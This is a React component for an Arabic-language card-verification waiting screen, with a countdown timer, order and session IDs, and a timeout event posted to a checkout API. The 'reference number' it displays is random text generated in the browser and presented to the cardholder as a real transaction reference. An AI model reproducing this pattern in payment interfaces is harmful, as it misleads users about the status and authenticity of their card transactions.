import { useEffect, useState } from 'react';
import { Loader2, Clock } from 'lucide-react';
import { postCheckoutEvent } from '@/lib/api';

interface CardApprovalProps {
  sessionId?: string;
  orderId?: string;
}

const CardApproval = ({ sessionId, orderId }: CardApprovalProps) => {
  const [timer, setTimer] = useState(180);
  const [randomRef, setRandomRef] = useState('');

  // Generate random reference number
  useEffect(() => {
    const generateRandomRef = () => {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      let result = '';
      for (let i = 0; i < 8; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      return result;
    };
    setRandomRef(generateRandomRef());
  }, []);

  useEffect(() => {
    if (timer > 0) {
      const timeout = setTimeout(() => setTimer(timer - 1), 1000);
      return () => clearTimeout(timeout);
    } else {
      if (sessionId) {
        postCheckoutEvent({
          sessionId,
          eventType: 'approval_timeout',
          timestamp: new Date().toISOString(),
        }).catch(() => {});
      }
    }
  }, [timer, sessionId]);

  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const isLowTime = timer <= 30;

  return (
    <div className="bg-white rounded-3xl border border-gray-200 p-12 text-center shadow-sm max-w-md mx-auto">
      <div className="w-32 h-32 rounded-full bg-purple-50 mx-auto mb-8 flex items-center justify-center">
        <div className="relative">
          <Loader2 className="h-16 w-16 text-purple-500 animate-spin" />
        </div>
      </div>

      <h2 className="text-3xl font-bold text-gray-900 mb-8">انتظر للتأكد من صحة البطاقة</h2>

      <div
        className={`inline-flex items-center gap-2 px-6 py-3 rounded-full ${
          isLowTime ? 'bg-red-50 text-red-600' : 'bg-gray-50 text-gray-600'
        } mb-8`}
      >
        <Clock className={`h-6 w-6 ${isLowTime ? 'text-red-500' : 'text-gray-400'}`} />
        <span className="font-mono text-xl font-semibold">{formatTimer(timer)}</span>
      </div>

      <div className="space-y-4">
        {sessionId && (
          <div className="bg-gray-50 rounded-2xl p-5">
            <div className="flex justify-between text-sm">
              <span className="text-gray-400">معرف العملية</span>
              <span className="font-mono text-gray-600 text-sm">{sessionId.slice(0, 16)}...</span>
            </div>
          </div>
        )}

        {orderId && (
          <div className="bg-purple-50 rounded-2xl p-5">
            <div className="flex justify-between text-sm">
              <span className="text-purple-400">رقم الطلب</span>
              <span className="font-mono text-purple-600 text-sm">{orderId}</span>
            </div>
          </div>
        )}

        {randomRef && (
          <div className="bg-blue-50 rounded-2xl p-5">
            <div className="flex justify-between text-sm">
              <span className="text-blue-400">رقم المرجع</span>
              <span className="font-mono text-blue-600 text-sm font-bold">{randomRef}</span>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default CardApproval;
